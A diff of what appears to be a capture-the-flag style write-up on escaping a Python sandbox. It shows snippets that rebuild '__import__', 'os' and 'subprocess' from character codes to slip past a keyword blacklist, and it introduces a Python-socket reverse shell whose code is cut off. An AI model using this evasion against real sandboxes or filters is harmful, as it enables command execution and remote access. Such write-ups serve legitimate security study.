@@ -109,7 +109,7 @@ subprocess.run(['<some command>'], capture_output=True, text=True)
 We can update our code and retrieve the current user :
 
 ```python
-# obfuscating `__import__` and `subprocess` strings to escape keywords blacklist
+# `__import__` and `subprocess` strings to escape keywords blacklist
 imp_key = "".join([chr(i) for i in [95, 95, 105, 109, 112, 111, 114, 116, 95, 95]])
 sub = ''.join([chr(i) for i in [115, 117, 98, 112, 114, 111, 99, 101, 115, 115]])
 
@@ -133,7 +133,7 @@ print(cmd_res)
 Now, we can easily extend our code and setup a reverse-shell using [python socket](https://highon.coffee/blog/reverse-shell-cheat-sheet/#python-reverse-shell) : 
 
 ```python
-# obfuscating `__import__`, `os` and `subprocess` strings to escape keywords blacklist
+# `__import__`, `os` and `subprocess` strings to escape keywords blacklist
 imp_key = "".join([chr(i) for i in [95, 95, 105, 109, 112, 111, 114, 116, 95, 95]])
 o_s_key = "".join([chr(i) for i in [111, 115]])            
 sub = "".join([chr(i) for i in [115, 117, 98, 112, 114, 111, 99, 101, 115, 115]])
